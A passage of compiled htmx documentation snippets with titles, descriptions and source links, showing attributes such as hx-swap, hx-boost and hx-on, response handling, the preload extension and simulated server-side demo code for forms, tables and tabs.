https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/reset-user-input.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\n<script>\n\n    //=========================================================================\n    // Fake Server Side Code\n    //=========================================================================\n\n    // routes\n    init(\"/demo\", function(request) {\n        return formTemplate();\n    })\n\n    onPost(\"/note\", function(request, params) {\n        var note = params['note-text'];\n        if (note) {\n            return `<li>${note}</li>`;\n        }\n    })\n\n    // templates\n    function formTemplate() {\n        return `\n<form hx-post=\"/note\" hx-target=\"#notes\" hx-swap=\"afterbegin\" hx-on::after-request=\"if(event.detail.successful) this.reset()\">\n    <div class=\"form-group\">\n        <label>Add a note</label>\n        <input type=\"text\" name=\"note-text\" placeholder=\"blank canvas\">\n    </div>\n    <button class=\"btn primary\">Add</button>\n</form>\n<ul id=\"notes\"> </ul>`;\n    }\n</script>\n```\n\n----------------------------------------\n\nTITLE: HTML Table Template (JavaScript)\nDESCRIPTION: This JavaScript function generates an HTML table with a header and initial rows populated with contact data.  It uses the `rowsTemplate` function to create the initial set of rows.  The `hx-indicator` attribute on the table uses the image as a loading indicator.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/infinite-scroll.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\n    function tableTemplate(contacts) {\n      return `<table hx-indicator=\".htmx-indicator\"><thead><tr><th>Name</th><th>Email</th><th>ID</th></tr></thead><tbody>\n              ${rowsTemplate(1, contacts)}\n              </tbody></table><center><img class=\"htmx-indicator\" width=\"60\" src=\"/img/bars.svg\"></center>`\n    }\n```\n\n----------------------------------------\n\nTITLE: TomSelect initialization in htmx.onLoad (JavaScript)\nDESCRIPTION: This JavaScript code snippet shows how to initialize TomSelect on new content loaded by htmx.  It uses `htmx.onLoad` to find elements with the `.tomselect` class and initialize a TomSelect instance for each.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_37\n\nLANGUAGE: javascript\nCODE:\n```\nhtmx.onLoad(function (target) {\n    // find all elements in the new content that should be\n    // an editor and init w/ TomSelect\n    var editors = target.querySelectorAll(\".tomselect\")\n            .forEach(elt => new TomSelect(elt))\n});\n```\n\n----------------------------------------\n\nTITLE: Basic hx-swap Example\nDESCRIPTION: This code snippet demonstrates the basic usage of the `hx-swap` attribute to append the content received from `/example` after the `div` element. It showcases how to trigger an AJAX request using `hx-get` and specify the swap strategy.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-swap.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n  <div hx-get=\"/example\" hx-swap=\"afterend\">Get Some HTML & Append It</div>\n```\n\n----------------------------------------\n\nTITLE: Configuring Response Handling with JavaScript in htmx\nDESCRIPTION: This JavaScript snippet demonstrates how to configure the `htmx.config.responseHandling` array to customize how htmx processes HTTP responses.  It defines how different response codes should be handled, including whether to swap content, treat the response as an error, and specify alternative targets or swap mechanisms. This is used to globally adjust htmx's default response handling behavior.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_39\n\nLANGUAGE: javascript\nCODE:\n```\n    responseHandling: [\n        {code:\"204\", swap: false},   // 204 - No Content by default does nothing, but is not an error\n        {code:\"[23]..\", swap: true}, // 200 & 300 responses are non-errors and are swapped\n        {code:\"[45]..\", swap: false, error:true}, // 400 & 500 responses are not swapped and are errors\n        {code:\"...\", swap: false}    // catch all for any other response code\n    ]\n```\n\n----------------------------------------\n\nTITLE: HTML Response with Account Links\nDESCRIPTION: This snippet illustrates an HTML response from a server containing account information and links to possible follow-up actions like deposits, withdrawals, transfers, and close requests. It demonstrates how HATEOAS embeds available actions within the hypermedia.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/hateoas.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\nHTTP/1.1 200 OK\n\n<html>\n  <body>\n    <div>Account number: 12345</div>\n    <div>Balance: $100.00 USD</div>\n    <div>Links:\n        <a href=\"/accounts/12345/deposits\">deposits</a>\n        <a href=\"/accounts/12345/withdrawals\">withdrawals</a>\n        <a href=\"/accounts/12345/transfers\">transfers</a>\n        <a href=\"/accounts/12345/close-requests\">close-requests</a>\n    </div>\n  <body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Listening for a Triggered Event with JavaScript\nDESCRIPTION: This JavaScript code snippet demonstrates how to listen for a custom event triggered by the `HX-Trigger` response header in htmx. It attaches an event listener to the `body` element, which catches the bubbling event, and displays an alert when the event is triggered.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/headers/hx-trigger.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\ndocument.body.addEventListener(\"myEvent\", function(evt){\n    alert(\"myEvent was triggered!\");\n})\n```\n\n----------------------------------------\n\nTITLE: Dynamically Evaluating hx-request with JavaScript\nDESCRIPTION: This HTML snippet shows how to dynamically evaluate the values of the `hx-request` attribute using JavaScript. The `js:` prefix allows you to execute a JavaScript expression and use the result as the value for the attribute.  In this example, the timeout is dynamically set using the `getTimeoutSetting()` function.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-request.md#_snippet_1\n\nLANGUAGE: HTML\nCODE:\n```\n<div ... hx-request='js: timeout:getTimeoutSetting() '>\n  ...\n</div>\n```\n\n----------------------------------------\n\nTITLE: Adding a Callback for htmx:load Event (JavaScript)\nDESCRIPTION: This snippet demonstrates how to add a callback function to the `htmx:load` event using `htmx.onLoad()`. This callback is executed whenever new content is loaded by htmx. It's useful for initializing the new content with JavaScript libraries.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/api.md#_snippet_14\n\nLANGUAGE: javascript\nCODE:\n```\nhtmx.onLoad(function(elt){\n    MyLibrary.init(elt);\n})\n```\n\n----------------------------------------\n\nTITLE: Setting HTMX Configuration via Meta Tag\nDESCRIPTION: This snippet demonstrates how to configure HTMX options declaratively using a `<meta>` tag.  The `content` attribute of the meta tag holds a JSON object representing the configuration settings. This allows for initial configuration of HTMX behavior directly in the HTML markup, before any JavaScript code is executed.  The configuration options are parsed by HTMX upon initialization.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/reference.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<meta name=\"htmx-config\" content='{\"defaultSwapStyle\":\"outerHTML\"}'>\n```\n\n----------------------------------------\n\nTITLE: Active Search with htmx HTML Example\nDESCRIPTION: This HTML snippet demonstrates an active search feature implemented using htmx. It uses hx-post to send a request to the server as the user types, hx-trigger to define the event that triggers the request, hx-target to specify the element to update with the response, and hx-indicator to show a loading indicator. The server is expected to return HTML that will replace the content of the #search-results element.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/hypermedia-driven-applications.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<!DOCTYPE html>\n<html>\n<head>\n  <title>Active Search Example</title>\n</head>\n<body>\n  <h3>\n    Search Contacts\n    <span class=\"htmx-indicator\">\n      <img src=\"/img/bars.svg\"/> Searching...\n    </span>\n  </h3>\n  <input class=\"form-control\" type=\"search\"\n         name=\"search\" placeholder=\"Begin Typing To Search Users...\"\n         hx-post=\"/search\"\n         hx-trigger=\"keyup changed delay:500ms, search\"\n         hx-target=\"#search-results\"\n         hx-indicator=\".htmx-indicator\">\n\n  <table class=\"table\">\n    <thead>\n      <tr>\n        <th>First Name</th>\n        <th>Last Name</th>\n        <th>Email</th>\n      </tr>\n    </thead>\n    <tbody id=\"search-results\">\n    </tbody>\n  </table>\n</body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Swapping Style with hx-swap\nDESCRIPTION: This snippet demonstrates using `hx-swap` to swap the entire element. This is used to dynamically replace an element with a response from the server. Requires htmx library.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/migration-guide-intercooler.md#_snippet_18\n\nLANGUAGE: html\nCODE:\n```\nhx-swap\n```\n\n----------------------------------------\n\nTITLE: Taking a Class from Siblings with htmx (JavaScript)\nDESCRIPTION: This snippet demonstrates how to use the `htmx.takeClass()` method to remove a specific class from all siblings of a given element and add it to the element itself.  This is useful for implementing tabbed interfaces or other similar UI patterns.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/api.md#_snippet_21\n\nLANGUAGE: javascript\nCODE:\n```\n// takes the selected class from tab2's siblings\nhtmx.takeClass(htmx.find(\"#tab2\"), \"selected\");\n```\n\n----------------------------------------\n\nTITLE: Triggering a Custom Event with htmx (JavaScript)\nDESCRIPTION: This snippet demonstrates how to trigger a custom event on an element using the `htmx.trigger()` method. The method takes the element, the event name, and an optional detail object as parameters. This allows for custom event handling and communication between different parts of an application.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/api.md#_snippet_23\n\nLANGUAGE: javascript\nCODE:\n```\n// triggers the myEvent event on #tab2 with the answer 42\nhtmx.trigger(\"#tab2\", \"myEvent\", {answer:42});\n```\n\n----------------------------------------\n\nTITLE: Using Dashes as Separators with hx-on in HTML\nDESCRIPTION: Demonstrates the use of dashes as separators in `hx-on` attributes, particularly for compatibility with templating languages like JSX.  This offers an alternative syntax to colons. Two equivalent examples shown.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-on.md#_snippet_3\n\nLANGUAGE: HTML\nCODE:\n```\n<!-- These two are equivalent -->\n<button hx-get=\"/info\" hx-on-htmx-before-request=\"alert('Making a request!')\">\n    Get Info!\n</button>\n\n<button hx-get=\"/info\" hx-on--before-request=\"alert('Making a request!')\">\n    Get Info!\n</button>\n```\n\n----------------------------------------\n\nTITLE: Hyperscript Tab Logic\nDESCRIPTION: This JavaScript code uses Hyperscript's `onGet` function to define the content returned for each tab endpoint (/tab1, /tab2, /tab3).  These functions return HTML paragraphs containing placeholder text. It requires the inclusion of the hyperscript.org library.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/tabs-javascript.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\n<script>\n\tonGet(\"/tab1\", function() {\n\t\treturn `\n\t\t\t<p>Commodo normcore truffaut VHS duis gluten-free keffiyeh iPhone taxidermy godard ramps anim pour-over.\n\t\t\tPitchfork vegan mollit umami quinoa aute aliquip kinfolk eiusmod live-edge cardigan ipsum locavore.\n\t\t\tPolaroid duis occaecat narwhal small batch food truck.\n\t\t\tPBR&B venmo shaman small batch you probably haven't heard of them hot chicken readymade.\n\t\t\tEnim tousled cliche woke, typewriter single-origin coffee hella culpa.\n\t\t\tArt party readymade 90's, asymmetrical hell of fingerstache ipsum.</p>\n\t\t`});\n\tonGet(\"/tab2\", function() {\n\t\treturn `\n\t\t\t<p>Kitsch fanny pack yr, farm-to-table cardigan cillum commodo reprehenderit plaid dolore cronut meditation.\n\t\t\tTattooed polaroid veniam, anim id cornhole hashtag sed forage.\n\t\t\tMicrodosing pug kitsch enim, kombucha pour-over sed irony forage live-edge.\n\t\t\tVexillologist eu nulla trust fund, street art blue bottle selvage raw denim.\n\t\t\tDolore nulla do readymade, est subway tile affogato hammock 8-bit.\n\t\t\tGodard elit offal pariatur you probably haven't heard of them post-ironic.\n\t\t\tPrism street art cray salvia.</p>\n\t\t`\n\t});\n\tonGet(\"/tab3\", function() {\n\t\treturn `\n\t\t\t<p>Aute chia marfa echo park tote bag hammock mollit artisan listicle direct trade.\n\t\t\tRaw denim flexitarian eu godard etsy.\n\t\t\tPoke tbh la croix put a bird on it fixie polaroid aute cred air plant four loko gastropub swag non brunch.\n\t\t\tIceland fanny pack tumeric magna activated charcoal bitters palo santo laboris quis consectetur cupidatat portland aliquip venmo.</p>\n\t\t`\n\t});\n\n</script>\n```\n\n----------------------------------------\n\nTITLE: Boosting Links with hx-boost - HTML\nDESCRIPTION: This snippet demonstrates how to use the hx-boost attribute to convert standard HTML links into AJAX requests. When a link within the div is clicked, an AJAX GET request is sent to the corresponding URL, and the body's inner content is replaced with the response. Requires htmx library.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-boost.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<div hx-boost=\"true\">\n  <a href=\"/page1\">Go To Page 1</a>\n  <a href=\"/page2\">Go To Page 2</a>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Add CSS Class to Element - htmx.addClass() - JavaScript\nDESCRIPTION: This code snippet demonstrates how to add a CSS class to an HTML element using the `htmx.addClass()` method. It shows both adding the class immediately and adding it after a specified delay in milliseconds.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/api.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n// add the class 'myClass' to the element with the id 'demo'\nhtmx.addClass(htmx.find('#demo'), 'myClass');\n\n// add the class 'myClass' to the element with the id 'demo' after 1 second\nhtmx.addClass(htmx.find('#demo'), 'myClass', 1000);\n```\n\n----------------------------------------\n\nTITLE: Sending Patch Request with hx-patch\nDESCRIPTION: This snippet shows how to send a PATCH request to a URL using htmx's `hx-patch`. Sends a PATCH request to the given URL. Requires the htmx library.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/migration-guide-intercooler.md#_snippet_9\n\nLANGUAGE: html\nCODE:\n```\nhx-patch\n```\n\n----------------------------------------\n\nTITLE: Disabling Specific Attribute Inheritance with hx-disinherit\nDESCRIPTION: This snippet shows how to disable inheritance for specific htmx attributes using the hx-disinherit attribute. In this example, inheritance is disabled for hx-target, while hx-select is still inherited by the child button element.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-disinherit.md#_snippet_1\n\nLANGUAGE: HTML\nCODE:\n```\n<div hx-boost=\"true\" hx-select=\"#content\" hx-target=\"#content\" hx-disinherit=\"hx-target\">\n  <!-- hx-select is automatically set to parent's value; hx-target is not inherited -->\n  <button hx-get=\"/test\"></button>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Replacing URL with specific URL in htmx\nDESCRIPTION: Demonstrates using `hx-replace-url` with a specific URL to replace the current URL in the browser's location history after an htmx request. The `hx-get` attribute triggers a GET request to `/account`. After the response, the URL in the browser's address bar will be updated to `/account/home`.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-replace-url.md#_snippet_1\n\nLANGUAGE: HTML\nCODE:\n```\n<div hx-get=\"/account\" hx-replace-url=\"/account/home\">\n  Go to My Account\n</div>\n```\n\n----------------------------------------\n\nTITLE: Async Auth Token Handling with htmx Events\nDESCRIPTION: This JavaScript snippet manages asynchronous authentication tokens and integrates them with htmx requests. It listens for the htmx:confirm event to delay requests until the auth promise resolves. It adds the authentication token as a header to each request using the htmx:configRequest event.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/async-auth.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\n<script>\n  // auth is a promise returned by our authentication system\n\n  // await the auth token and store it somewhere\n  let authToken = null;\n  auth.then((token) => {\n    authToken = token\n  })\n  \n  // gate htmx requests on the auth token\n  htmx.on(\"htmx:confirm\", (e)=> {\n    // if there is no auth token\n    if(authToken == null) {\n      // stop the regular request from being issued\n      e.preventDefault() \n      // only issue it once the auth promise has resolved\n      auth.then(() => e.detail.issueRequest()) \n    }\n  })\n\n  // add the auth token to the request as a header\n  htmx.on(\"htmx:configRequest\", (e)=> {\n    e.detail.headers[\"AUTH\"] = authToken\n  })\n</script>\n```\n\n----------------------------------------\n\nTITLE: Initializing Tabs with HTMX\nDESCRIPTION: This HTML snippet initializes the tabs section by triggering an HTMX GET request to '/tab1' when the page loads.  The response is inserted into the 'tabs' div using innerHTML swapping.  This loads the initial tab content.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/tabs-hateoas.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<div id=\"tabs\" hx-get=\"/tab1\" hx-trigger=\"load delay:100ms\" hx-target=\"#tabs\" hx-swap=\"innerHTML\"></div>\n```\n\n----------------------------------------\n\nTITLE: Defining Webring Navigation with htmx\nDESCRIPTION: This HTML snippet defines the navigation links for the webring (Prev, Random, Next) and uses htmx attributes (`_`) to handle the logic for cycling through the sites in the webring. It uses tiny-directives to manipulate element attributes and content based on user clicks.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/webring.md#_snippet_1\n\nLANGUAGE: HTML\nCODE:\n```\n<a\n         class=\"nav-link\"\n         href=\"#\" \n         _=\"on click\n             set links to <a/> in the #ring-table\n             decrement :index\n             if :index is -1\n                get the length of the links\n                set :index to the result - 1 \n             end\n             log :index\n             get links[:index]\n             set the #webring's src to the result's @href\n             \">Prev</a>\n```\n\nLANGUAGE: HTML\nCODE:\n```\n<a href=\"#\" class=\"nav-link\" _=\"on click\n             set links to <a/> in the #ring-table\n             get the :index\n             repeat until the result is not :index\n                get Math.floor(Math.random() * length of the links)\n             end\n             set the :index to the result\n             get links[:index]\n             set the #webring's src to the result's @href\n             \">Random</a>\n```\n\nLANGUAGE: HTML\nCODE:\n```\n<a href=\"#\" class=\"nav-link\" _=\"on click\n             set links to <a/> in the #ring-table\n             increment :index\n             if :index is length of the links\n                set :index to 0\n             end\n             get links[:index]\n             set the #webring's src to the result's @href\n             \">Next</a>\n```\n\n----------------------------------------\n\nTITLE: htmx: Button with AJAX POST Request\nDESCRIPTION: This HTML snippet demonstrates a basic htmx example: a button that, when clicked, sends an AJAX POST request to the '/clicked' endpoint. The `hx-swap=\"outerHTML\"` attribute specifies that the entire button element should be replaced with the HTML response from the server.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/_index.md#_snippet_2\n\nLANGUAGE: HTML\nCODE:\n```\n  <script src=\"https://unpkg.com/htmx.org@2.0.4\"></script>\n  <!-- have a button POST a click via AJAX -->\n  <button hx-post=\"/clicked\" hx-swap=\"outerHTML\">\n    Click Me\n  </button>\n```\n\n----------------------------------------\n\nTITLE: Targeting different divs based on response code\nDESCRIPTION: This snippet shows how to target different `div` elements based on the HTTP response code from a POST request to `/register`.  It uses `hx-target` for the default 200 response, `hx-target-5*` for 5xx server errors, and `hx-target-404` for 404 Not Found errors. The `hx-ext` attribute enables the response-targets extension.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/response-targets.md#_snippet_2\n\nLANGUAGE: HTML\nCODE:\n```\n<div hx-ext=\"response-targets\">\n<div id=\"response-div\"></div>\n<button hx-post=\"/register\"\nhx-target=\"#response-div\"\nhx-target-5*=\"#serious-errors\"\nhx-target-404=\"#not-found\">\nRegister!\n</button>\n<div id=\"serious-errors\"></div>\n<div id=\"not-found\"></div>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Complete API Endpoint Definitions\nDESCRIPTION: This snippet aggregates all the API endpoint definitions discussed in the article, providing a comprehensive overview of the hypermedia API design for managing contacts. It includes endpoints for rendering the form and table, creating new contacts, and updating the table via polling.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/hypermedia-apis-vs-data-apis.md#_snippet_6\n\nLANGUAGE: txt\nCODE:\n```\n  GET /contacts -> render the form & contacts table\n  POST /contacts -> create the new contact, redirect to GET /contacts\n  GET /contacts/table -> render the contacts table\n```\n\n----------------------------------------\n\nTITLE: htmx POST Request on Mouseenter\nDESCRIPTION: This example demonstrates how to use the `hx-post` attribute and `hx-trigger` attribute to issue a POST request when the mouse enters the div element. The POST request is sent to `/mouse_entered`.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_10\n\nLANGUAGE: HTML\nCODE:\n```\n<div hx-post=\"/mouse_entered\" hx-trigger=\"mouseenter\">\n    [Here Mouse, Mouse!]\n</div>\n```\n\n----------------------------------------\n\nTITLE: Using hx-target-error for general error handling\nDESCRIPTION: This snippet demonstrates how to use `hx-target-error` to handle both 4xx and 5xx error responses from a POST request to `/register`. It targets a specific `div` with the id `any-errors` when any error response code is received. The `hx-ext` attribute enables the response-targets extension.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/response-targets.md#_snippet_3\n\nLANGUAGE: HTML\nCODE:\n```\n<div hx-ext=\"response-targets\">\n<div id=\"response-div\"></div>\n<button hx-post=\"/register\"\nhx-target=\"#response-div\"\nhx-target-error=\"#any-errors\">\nRegister!\n</button>\n<div id=\"any-errors\"></div>\n</div>\n```\n\n----------------------------------------\n\nTITLE: JavaScript: Fake Server-Side Logic and HTMX Routes\nDESCRIPTION: This JavaScript code simulates server-side logic using a `dataStore` object to manage user data. It also defines HTMX routes using `init` and `onPost` to handle requests to `/demo` and `/users` respectively. These functions are used to display the UI and handle bulk updates of user statuses based on checkbox values submitted in the POST request.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/bulk-update.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\n    //=========================================================================\n    // Fake Server Side Code\n    //=========================================================================\n\n    const dataStore = (() => {\n      const data = {\n        \"joe@smith.org\": {name: 'Joe Smith', status: 'Active'},\n        \"angie@macdowell.org\": {name: 'Angie MacDowell', status: 'Active'},\n        \"fuqua@tarkenton.org\": {name: 'Fuqua Tarkenton', status: 'Active'},\n        \"kim@yee.org\": {name: 'Kim Yee', status: 'Inactive'},\n      };\n\n      return {\n        all() {\n          return data;\n        },\n\n        activate(email) {\n          if (data[email].status === 'Active') {\n            return 0;\n          } else {\n            data[email].status = 'Active';\n            return 1;\n          }\n        },\n\n        deactivate(email) {\n          if (data[email].status === 'Inactive') {\n            return 0;\n          } else {\n            data[email].status = 'Inactive';\n            return 1;\n          }\n        },\n      };\n    })();\n\n    // routes\n    init(\"/demo\", function(request){\n        return displayUI(dataStore.all());\n    });\n\n    /*\n    Params look like:\n    {\"active:joe@smith.org\":\"on\",\"active:angie@macdowell.org\":\"on\",\"active:fuqua@tarkenton.org\":\"on\"}\n    */\n    onPost(\"/users\", function (req, params) {\n      const actives = {};\n      let activated = 0;\n      let deactivated = 0;\n\n      // Build a set of active users for efficient lookup\n      for (const param of Object.keys(params)) {\n        const nameEmail = param.split(':');\n        if (nameEmail[0] === 'active') {\n          actives[nameEmail[1]] = true;\n        }\n      }\n\n      // Activate or deactivate users based on the lookup\n      for (const email of Object.keys(dataStore.all())) {\n        if (actives[email]) {\n          activated += dataStore.activate(email);\n        } else {\n          deactivated += dataStore.deactivate(email);\n        }\n      }\n\n      return `Activated ${activated} and deactivated ${deactivated} users`;\n    });\n\n    // templates\n    function displayUI(contacts) {\n      return `<h3>Select Rows And Activate Or Deactivate Below</h3>\n               <form\n                id=\"checked-contacts\"\n                hx-post=\"/users\"\n                hx-swap=\"innerHTML settle:3s\"\n                hx-target=\"#toast\"\n              >\n                <table>\n                  <thead>\n                  <tr>\n                    <th>Name</th>\n                    <th>Email</th>\n                    <th>Active</th>\n                  </tr>\n                  </thead>\n                  <tbody id=\"tbody\">\n                    ${displayTable(contacts)}\n                  </tbody>\n                </table>\n                <input type=\"submit\" value=\"Bulk Update\" class=\"btn primary\">\n                <output id=\"toast\"></output>\n              </form>\n              <br>`;\n    }\n\n    function displayTable(contacts) {\n      var txt = \"\";\n\n      for (email of Object.keys(contacts)) {\n        txt += `\n<tr>\n  <td>${contacts[email].name}</td>\n  <td>${email}</td>\n  <td>\n    <input\n      type=\"checkbox\"\n      name=\"active:${email}\"\n      ${contacts[email].status === 'Active' ? 'checked' : ''}>\n  </td>\n</tr>\n`;\n      }\n\n      return txt;\n    }\n\n```\n\n----------------------------------------\n\nTITLE: Aborting Validation Request on Form Submission with hx-sync - HTML\nDESCRIPTION: This snippet demonstrates using the `hx-sync` attribute to abort an input's validation request if a form submission request is initiated. This ensures that the validation request is superseded by the form submission.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_22\n\nLANGUAGE: html\nCODE:\n```\n<form hx-post=\"/store\">\n    <input id=\"title\" name=\"title\" type=\"text\"\n        hx-post=\"/validate\"\n        hx-trigger=\"change\"\n        hx-sync=\"closest form:abort\">\n    <button type=\"submit\">Submit</button>\n</form>\n```\n\n----------------------------------------\n\nTITLE: JavaScript: Simulated Server-Side Code\nDESCRIPTION: This JavaScript code simulates server-side logic for handling contact data. It includes functions for initializing routes, handling GET and PUT requests, and rendering HTML templates for table rows and editable rows. It depends on global functions like init, onGet, onPut and demo-specific template functions.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/edit-row.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\n<script>\n    //=========================================================================\n    // Fake Server Side Code\n    //=========================================================================\n\n    // data\n    var contacts = [\n      {\n        name: \"Joe Smith\",\n        email: \"joe@smith.org\",\n        status: \"Active\",\n        id: 0\n      },\n      {\n        name: \"Angie MacDowell\",\n        email: \"angie@macdowell.org\",\n        status: \"Active\",\n        id: 1\n      },\n      {\n        name: \"Fuqua Tarkenton\",\n        email: \"fuqua@tarkenton.org\",\n        status: \"Active\",\n        id: 2\n      },\n      {\n        name: \"Kim Yee\",\n        email: \"kim@yee.org\",\n        status: \"Inactive\",\n        id: 3\n      },\n    ];\n\n    // routes\n    init(\"/demo\", function(request, params){\n      return tableTemplate(contacts);\n    });\n\n    onGet(/\\/contact\\/\\d+/, function(request, params){\n      var id = parseInt(request.url.split(\"/\")[2]); // get the contact\n      var contact = contacts[id];\n      console.log(request, id, contact)\n      if(request.url.endsWith(\"/edit\")) {\n        return editTemplate(contacts[id])\n      } else {\n        return rowTemplate(contacts[id])\n      }\n    });\n\n    onPut(/\\/contact\\/\\d+/, function(request, params){\n      var id = parseInt(request.url.split(\"/\")[2]); // get the contact\n      contact = contacts[id]\n      contact.name = params['name'];\n      contact.email = params['email'];\n      return rowTemplate(contact);\n    });\n\n    // templates\n    function rowTemplate(contact) {\n      return `<tr>\n      <td>${contact.name}</td>\n      <td>${contact.email}</td>\n      <td>\n        <button class=\"btn danger\"\n                hx-get=\"/contact/${contact.id}/edit\"\n                hx-trigger=\"edit\"\n                onClick=\"let editing = document.querySelector('.editing')\n                         if(editing) {\n                           Swal.fire({title: 'Already Editing',\n                                      showCancelButton: true,\n                                      confirmButtonText: 'Yep, Edit This Row!',\n                                      text:'Hey!  You are already editing a row!  Do you want to cancel that edit and continue?'})\n                           .then((result) => {\n                                if(result.isConfirmed) {\n                                   htmx.trigger(editing, 'cancel')\n                                   htmx.trigger(this, 'edit')\n                                }\n                            })\n                         } else {\n                            htmx.trigger(this, 'edit')\n                         }\">\n          Edit\n        </button>\n      </td>\n    </tr>`;\n    }\n\n    function editTemplate(contact) {\n      return `<tr hx-trigger='cancel' class='editing' hx-get=\"/contact/${contact.id}\">\n      <td><input autofocus name='name' value='${contact.name}'</td>\n      <td><input name='email' value='${contact.email}'</td>\n      <td>\n        <button class=\"btn danger\" hx-get=\"/contact/${contact.id}\">\n          Cancel\n        </button>\n        <button class=\"btn danger\" hx-put=\"/contact/${contact.id}\" hx-include=\"closest tr\">\n          Save\n        </button>\n      </td>\n    </tr>`;\n    }\n\n    function tableTemplate(contacts) {\n      var rows = \"\";\n\n      for (var i = 0; i < contacts.length; i++) {\n        rows += rowTemplate(contacts[i], i, \"\");\n      }\n\n      return `\n<table class=\"table delete-row-example\">\n  <thead>\n    <tr>\n      <th>Name</th>\n      <th>Email</th>\n      <th></th>\n    </tr>\n  </thead>\n  <tbody hx-target=\"closest tr\" hx-swap=\"outerHTML\">\n    ${rows}\n  </tbody>\n</table>`;\n    }\n</script>\n```\n\n----------------------------------------\n\nTITLE: Basic Preload Usage with Links\nDESCRIPTION: This HTML snippet demonstrates basic usage of the preload extension. Links with the `preload` attribute will be preloaded.  `hx-get` elements will also be preloaded. `hx-post` will not be preloaded.  Resources are loaded on mousedown by default.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/preload.md#_snippet_3\n\nLANGUAGE: HTML\nCODE:\n```\n<body hx-ext=\"preload\">\n<h1>What Works</h2>\n    <a href=\"/server/1\" preload>WILL BE requested using a standard XMLHttpRequest() and default options (below)</a>\n    <button hx-get=\"/server/2\" preload>WILL BE requested with additional htmx headers.</button>\n\n    <h1>What WILL NOT WORK</h1>\n    <a href=\"/server/3\">WILL NOT be preloaded because it does not have an explicit \"preload\" attribute</a>\n    <a hx-post=\"/server/4\" preload>WILL NOT be preloaded because it is an HX-POST transaction.</a>\n</body>\n```\n\n----------------------------------------\n\nTITLE: hx-swap with show modifier and CSS selector\nDESCRIPTION: This code snippet illustrates how to use the `show` modifier with a CSS selector to target a specific element for scrolling.  After content from `/example` is swapped into the current div, the top of the element with the ID `another-div` is made visible.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-swap.md#_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n  <!-- this will get some content and swap it into the current div, then ensure that the top of #another-div is visible in the \n       viewport -->\n  <div hx-get=\"/example\" \n       hx-swap=\"innerHTML show:#another-div:top\">\n    Get Some Content\n  </div>\n```\n\n----------------------------------------\n\nTITLE: Importing htmx and Preload Extension\nDESCRIPTION: This snippet shows how to import htmx core and the htmx-ext-preload extension in a JavaScript file, when using a bundler like Webpack or Rollup.  This is necessary after installing the packages via npm.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/preload.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport `htmx.org`;\nimport `htmx-ext-preload`; \n```\n\n----------------------------------------\n\nTITLE: Styling Progress Bar - CSS\nDESCRIPTION: This CSS defines the visual style of the progress bar, including its height, background color, border radius, and box shadow. It also styles the progress bar itself, setting its width, height, font size, and background color. The `transition` property ensures a smooth transition when the width of the progress bar changes.  The restart button starts hidden and then fades in.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/progress-bar.md#_snippet_3\n\nLANGUAGE: 